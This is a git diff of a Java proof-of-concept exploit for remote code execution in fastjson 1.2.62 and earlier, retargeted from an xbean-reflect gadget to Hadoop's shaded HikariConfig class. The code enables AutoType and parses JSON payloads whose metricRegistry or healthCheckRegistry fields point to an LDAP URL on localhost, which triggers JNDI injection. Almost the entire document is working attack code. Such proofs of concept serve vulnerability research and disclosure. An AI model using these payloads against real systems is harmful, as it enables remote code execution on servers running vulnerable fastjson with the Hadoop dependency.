+++ fastjson/src/main/java/com/threedr3am/bug/fastjson/rce/HadoopHikariPoc.java
@@ -1,4 +1,4 @@
-package com.threedr3am.bug.fastjson;
+package com.threedr3am.bug.fastjson.rce;
 
 import com.alibaba.fastjson.JSON;
 import com.alibaba.fastjson.parser.ParserConfig;
@@ -7,18 +7,15 @@ import com.threedr3am.bug.common.server.LdapServer;
 /**
  * fastjson <= 1.2.62 RCE，需要开启AutoType (report by threedr3am to ASRC)
  *
- * Jackson-databind的CVE-2020-8840 gadget与Fastjson通用
- *
- * XBean-reflect依赖的gadget
- *
  * <dependency>
- *       <groupId>org.apache.xbean</groupId>
- *       <artifactId>xbean-reflect</artifactId>
+ *       <groupId>org.apache.hadoop</groupId>
+ *       <artifactId>hadoop-client-minicluster</artifactId>
+ *       <version>3.2.1</version>
  * </dependency>
  *
  * @author threedr3am
  */
-public class JndiConverterPoc {
+public class HadoopHikariPoc {
   static {
     //rmi server示例
 //    RmiServer.run();
@@ -30,7 +27,8 @@ public class JndiConverterPoc {
   public static void main(String[] args) {
     ParserConfig.getGlobalInstance().setAutoTypeSupport(true);
 
-    String payload = "{\"@type\":\"org.apache.xbean.propertyeditor.JndiConverter\",\"asText\":\"ldap://localhost:43658/Calc\"}";//ldap方式
+    String payload = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"metricRegistry\":\"ldap://localhost:43658/Calc\"}";
+    String payload2 = "{\"@type\":\"org.apache.hadoop.shaded.com.zaxxer.hikari.HikariConfig\",\"healthCheckRegistry\":\"ldap://localhost:43658/Calc\"}";
     JSON.parse(payload);
   }
 }
